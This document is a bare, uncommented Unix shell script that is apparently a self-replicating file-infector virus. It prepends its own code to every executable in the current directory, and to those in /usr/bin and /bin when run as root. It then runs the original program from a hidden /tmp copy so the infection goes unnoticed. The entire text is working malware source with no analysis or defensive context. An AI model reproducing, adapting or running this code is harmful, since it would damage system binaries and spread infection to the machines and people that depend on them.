filesize=5
lines=36
thisfilesize=$filesize
if [ "`whoami`" = "root" ] ; then
ss="/usr/bin/* /bin/*"
fi
for filename in * $ss ; do
mname=`echo $filename | awk -F/ '{ print $NF }'`
if [ -x $filename ] ; then
if cp $filename /tmp/$mname.t > /dev/null 2> /dev/null ; then
if [ "`head -c 4 /tmp/$mname.t`" != "file" ] ; then
if rm -f $filename > /dev/null 2> /dev/null; then
filesize=`wc --bytes /tmp/$mname.t | awk '{print $1}'`
echo filesize=$filesize > $filename
head -$lines $0 | tail -`expr $lines - 1` >> $filename
tail -c $filesize /tmp/$mname.t >> $filename
chmod +x $filename
fi;fi;fi;fi
rm -f /tmp/$mname.t 2> /dev/null 1> /dev/null
done
mname=`echo $0 | awk -F/ '{ print $NF }'`
tname=/tmp/.$mname.t.$$
wname=/tmp/.$mname.w.$$
cp $0 $tname
echo filename=$0 > $wname
echo tname=$tname >> $wname
echo wname=$wname >> $wname
echo thisfilesize=$thisfilesize >> $wname
head -$lines $0 | tail -6 >> $wname
sh $wname $*
exit
tail -c $thisfilesize $tname > $filename
chmod +x $filename
$filename $* 
cp $tname $filename
rm -f $tname
rm -f $wname
exit
